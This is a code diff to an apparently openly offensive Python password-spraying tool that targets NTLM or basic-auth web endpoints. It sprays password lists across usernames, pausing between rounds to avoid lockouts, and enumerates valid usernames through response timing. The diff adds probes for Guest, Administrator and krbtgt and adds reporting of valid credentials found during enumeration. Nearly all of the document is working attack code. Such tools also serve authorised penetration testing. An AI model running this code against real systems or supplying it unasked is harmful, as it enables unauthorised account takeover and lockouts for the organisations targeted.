@@ -16,16 +16,14 @@ from multiprocessing import Pool
 
 valid_users = []
 
-def check_creds(opts):
 
+def check_creds(opts):
     url, domain, username, password, authtype, proxies, track_time = opts
-    
     if authtype == "ntlm":
         if domain:
             auth = HttpNtlmAuth(f"{domain}\\{username}", password)    
         else:
             auth = HttpNtlmAuth(username, password)
-
     else:
         if domain:
             auth = (f"{domain}\\{username}", password)
@@ -36,26 +34,25 @@ def check_creds(opts):
         res = requests.get(url, verify=False, proxies=proxies,
                            auth=auth, allow_redirects=False)
 
-
-
         if res.status_code != 401:
             if track_time:
                 print(f"Success! {username}:{password}")
             else:
                 print(f"Success! {username}:{password}")
-
             return username, password
-
         elif track_time:
             print(f"Fail:  {username}:{password}")
+
     except Exception as e:
         print(f"Error occurred with {username}:{password}: {e}")
+
 
 def do_request(domain, username, password, proxies, url):
     auth_false_domain = (f"{domain}\\{username}", password)
     res = requests.get(url, verify=False, proxies=proxies, auth=auth_false_domain, allow_redirects=False)
     print("[+] auth creds: %s\\%s, time elapsed: " % (domain, username) + str(res.elapsed))
     return res.elapsed
+
 
 def get_avg_time(opts, passwords):
 
@@ -76,14 +73,19 @@ def get_avg_time(opts, passwords):
     do_request(domain_test2, username2, passwords[0], proxies, url)
     do_request(domain_test3, username3, passwords[0], proxies, url)
 
+    print("[*] Performing correct Username & Domain Test")
+    do_request(domain, "Guest", passwords[0], proxies, url)
+    do_request(domain, "Administrator", passwords[0], proxies, url)
+    do_request(domain, "krbtgt", passwords[0], proxies, url)
+
     print("[*] Performing incorrect Username Test")
     time_one = do_request(domain, username1, passwords[0], proxies, url)
     time_two = do_request(domain, username2, passwords[0], proxies, url)
     time_three = do_request(domain, username3, passwords[0], proxies, url)
 
-
     avg_time = (time_one + time_two + time_three) / 3
     return avg_time, domain
+
 
 def check_username(opts):
     url, domain, username, password, authtype, proxies, track_time, thresh = opts
@@ -93,9 +95,14 @@ def check_username(opts):
     if res.elapsed <= thresh:
         print("[+] VALID USER FOUND: %s\\%s, time elapsed: " % (domain, username) + str(res.elapsed))
         valid_users.append(username)
+        if res.status_code != 401:
+            print("[!!] VALID CREDS FOUND: %s\\%s:%s, time elapsed: " % (domain, username, password) + str(res.elapsed))
+            return username,password
+            
     elif res.elapsed > thresh:
         #print("[-] INVALID USER: %s\\%s, time elapsed: " % (domain, username) + str(res.elapsed), flush=True)
         return
+
 
 def get_domain_name(url):
     reg = "^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.){2,}([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9]){2,}$"
@@ -155,28 +162,24 @@ if __name__ == "__main__":
     print(f"New password spraying run")
     print(f"Spraying {opts.attempts} passwords, then sleeping for {opts.interval}.")
     print(f"URL: {opts.url}")
+
     if(opts.check_creds):
-
         for p in passwords:
-
             i += 1
-
             print(f"{str(datetime.now())}: Attempting {p} ({current}/{total})")
             attempts = [ (opts.url, opts.domain, u, p, opts.authtype, proxies, opts.add_response) for u in usernames]
             with Pool(opts.threads) as p:
                 for s in p.imap_unordered(check_creds, attempts):
-            
                     if s:
                         f.write(f"{s[0]}:{s[1]}" + '\n')
                         f.flush()
-
             if i == opts.attempts:
                 print(f"{str(datetime.now())} Sleeping for {opts.interval} minutes.")
                 sleep(opts.interval * 60)
 
                 i = 0
-
             current += 1
+
     elif(opts.validate_users):
         attempts = (opts.url, opts.domain, opts.authtype, proxies, opts.add_response)
         avg_time, domain = get_avg_time(attempts, passwords)
@@ -189,7 +192,6 @@ if __name__ == "__main__":
         attempts = [(opts.url, domain, u, passwords[0], opts.authtype, proxies, opts.add_response, thresh) for u in usernames]
         with Pool(opts.threads) as p:
             for s in p.imap_unordered(check_username, attempts):
-
                 if s:
                     f.write(f"{s[0]}:{s[1]}" + '\n')
                     f.flush()
